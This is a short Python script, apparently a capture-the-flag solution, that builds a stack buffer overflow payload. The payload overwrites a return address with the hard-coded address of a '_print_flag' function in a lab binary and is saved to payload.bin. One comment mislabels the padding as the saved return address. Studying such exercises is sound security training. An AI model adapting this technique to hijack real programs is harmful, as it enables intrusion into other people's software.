# Python script to exploit the buffer overflow
import struct

# Address of the _print_flag function from the objdump table
print_flag_address = 0x555555555206
# Create the payload
buffer_size = 8  # Size of the buffer in the C program
saved_return_address_size = 8  # Size of the saved return address (64-bit system)

# Fill the buffer with dummy data ('A's)
payload = b"A" * buffer_size

# Add padding to overwrite saved return address
payload += b"B" * saved_return_address_size

# Overwrite the return address with the address of the _print_flag function
payload += struct.pack("<Q", print_flag_address)  # Little-endian 64-bit format

# Save the payload to a file (optional) or print it
with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload ready! Provide the following input to the program:")
print(payload)

